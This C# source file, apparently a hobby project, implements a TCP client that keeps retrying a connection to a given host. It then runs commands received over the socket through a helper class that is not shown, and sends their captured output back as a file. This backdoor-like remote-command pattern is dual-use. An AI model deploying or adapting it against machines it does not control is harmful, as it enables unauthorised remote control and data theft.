using Befehle;
using filesend;
using Networkstr;
using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;




namespace Client
{
    class client
    {
        public static networkstr netstr = new networkstr();
        public befehle befehle;

        public Filesend file = new Filesend();




        public void startclient(object[] list)
        {



            netstr.client = new TcpClient();

            int port = (int)list[1];
            string ip = (string)list[0];



            bool booll = true;
            //tcp initialisierung
            while (booll)
            {
                try
                {
                    netstr.client.Connect(ip, port);
                }
                catch (Exception ex)
                {

                }
                if (netstr.client.Connected == false)
                    booll = true;
                else
                    booll = false;
            }
            string data;




            //wird in main configuriert
            string id = Convert.ToString(netstr.client);
            netstr._Stream = netstr.client.GetStream();//zusatz gibt client namen eig sehr unnötig



            Thread taskwrite = new Thread(sww);
            taskwrite.Start();
            TextWriter tw = Console.Out;

            //initialiesiert datenstrom
            StreamReader sr = new StreamReader(netstr._Stream);
            while (true)
            {

                data = sr.ReadLine();
                Console.WriteLine(data);
                if (data == "exit")
                {
                    Environment.Exit(0);
                }
                else if (data.Contains("cmd"))
                {
                    int check = data.IndexOf("-");
                    int check2 = data.LastIndexOf("!");
                    int check3 = check2 + 2;
                    string name = data.Substring(check3);
                    FileStream fs = new FileStream(@"D:\Users\chako\Desktop\" + name, FileMode.Create, FileAccess.ReadWrite);
                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        Console.SetOut(sw);
                        data = data.Substring(check + 1, check2 - check - 1);
                        befehle = new befehle();
                        befehle.b1(data);
                        Console.SetOut(tw);
                        sw.Close();
                        netstr.streamre.WriteLine("File");
                        byte[] data7 = File.ReadAllBytes(@"D:\Users\chako\Desktop\" + name);
                        string data8 = data7.Length.ToString();
                        netstr.streamre.WriteLine(data8);
                        netstr.streamre.Flush();
                        netstr.client.Client.SendFile(@"D:\Users\chako\Desktop\" + name);
                        netstr.streamre.WriteLine("--Start--");
                    }



                }
               


            }


        }

        public static void sww()
        {
            netstr.streamre = new StreamWriter(netstr._Stream);
            string input;
            while (true)
            {


                input = Console.ReadLine();

                netstr.streamre.WriteLine(input);
                netstr.streamre.Flush();
            }


        }
    }
}





